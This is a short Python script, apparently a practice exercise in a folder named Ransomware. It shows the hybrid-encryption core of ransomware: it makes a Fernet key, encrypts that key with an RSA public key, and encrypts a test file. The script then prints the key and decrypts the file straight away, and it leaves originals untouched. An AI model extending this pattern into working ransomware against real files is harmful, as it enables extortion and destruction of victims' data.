from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding,rsa
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
from time import sleep

# "Fernet guarantees that a message encrypted using it cannot be maniplated
# or read without the key. Fernet is an implementation of symmetric (also known
# as "secret key") authenticated cryptography."
# -- https://cryptography.io/en/latest/fernet/

# Fernet.generate_key() creates a fresh fernet key.
# Store this key somewhere secure!
symmetricKey  = Fernet.generate_key()

FernetInstance = Fernet(symmetricKey)

print("Symmetric Key:")
print(symmetricKey)
print()

with open("/home/kali/Desktop/Ransomware/public_key.key", "rb") as key_file:
	file_data = key_file.read() # storing file data in variable for printing purposes
	
	# -- cryptography.hazmat.primitives.serialization.load_pem_private_key(data)
	# deserializes a public key from PEM data
	public_key = serialization.load_pem_public_key (
	# Passing the file's contents as the data field
	file_data,
	# Using "default backend"
	backend=default_backend()
	)
	
	print("Public Key")
	print(public_key)
	print()
	
	# Encrypting the public 

	encryptedSymmetricKey = public_key.encrypt (
	symmetricKey,
	padding.OAEP (mgf=padding.MGF1(algorithm=hashes.SHA256()),
	algorithm=hashes.SHA256(),
	label=None )
	)

	print("Encrypted Symmetric Key:")
	print(encryptedSymmetricKey)
	print()

with open("encryptedSymmertricKey.key", "wb") as key_file:
	# key_file.write(encryptedSymmetricKey)
	filePath = "/home/kali/Documents/ransom/test_files/test"

	with open(filePath, "rb") as file:
		file_data = file.read()
		print("File Data:")
		print(file_data)
		print()
		sleep(2)
		
		encrypted_data = FernetInstance.encrypt(file_data)
		print("Encrypted Data:")
		print(encrypted_data)
		print()
		sleep(2)
		
		decrypted_data = FernetInstance.decrypt(encrypted_data)
		print("Decrypted Data:")
		print(decrypted_data)
		print()
		sleep(2)

	quit()